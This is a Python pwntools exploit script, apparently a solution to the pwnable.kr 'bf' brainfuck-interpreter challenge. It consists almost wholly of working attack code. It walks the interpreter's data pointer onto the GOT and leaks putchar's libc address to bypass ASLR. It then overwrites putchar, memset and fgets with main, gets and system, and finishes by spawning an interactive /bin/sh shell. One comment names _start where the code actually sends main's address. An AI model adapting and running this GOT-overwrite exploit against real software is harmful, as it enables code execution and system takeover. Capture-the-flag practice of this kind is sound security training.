from pwn import *
from time import sleep

elf = ELF('./bf')
libc = ELF('./bf_libc.so')
p = process('./bf')
# p = remote('pwnable.kr', 9001)


pointer_base = 0x0804a0a0

# Move pointer to putchar got
p1 = b'<'*(pointer_base - elf.got['putchar'])

# Lazy loading
p1 += b'.'

# Leak address of putchar for ASLR bypass
p1 += b'.'
p1 += b'>' + b'.'
p1 += b'>' + b'.'
p1 += b'>' + b'.'

# Go back
p1 += b'<'*3

# Overwrite putchar to _start
p1 += b','
p1 += b'>' + b','
p1 += b'>' + b','
p1 += b'>' + b','

# Go back
p1 += b'<'*3

# Move to memset got
p1 += b'<'*(elf.got['putchar'] - elf.got['memset'])

# Overwrite with gets (to overflow stack and pass parameter to system)
p1 += b','
p1 += b'>' + b','
p1 += b'>' + b','
p1 += b'>' + b','

# Go back
p1 += b'<'*3

# Move to fgets got
p1 += b'<'*(elf.got['memset'] - elf.got['fgets'])

# Overwrite with system
p1 += b','
p1 += b'>' + b','
p1 += b'>' + b','
p1 += b'>' + b','

# Go back
p1 += b'<'*3

# Invoke _start again using the overwritten putchar got
p1 += b'.'

# Send first payload
p.sendlineafter(b'instructions except [ ]', p1)

# Read useless byte
p.recv(1)

# Read putchar leak address
putchar_addr = u32(p.recv(4), endian='little')

# Get libc base and other addresses
libc_base = putchar_addr - libc.symbols['putchar']
gets_addr = libc_base + libc.symbols['gets']
system_addr = libc_base + libc.symbols['system']

log.info("Leak: " + hex(putchar_addr))
log.info("Libc base: " + hex(libc_base))

# New putchar
p.send(p32(elf.symbols['main']))

# New memset
p.send(p32(libc_base + libc.symbols['gets']))

# New fgets
p.send(p32(libc_base + libc.symbols['system']))

# Store input with gets then call system with it
p.sendlineafter(b'instructions except [ ]', b'/bin/sh\x00')

p.interactive()
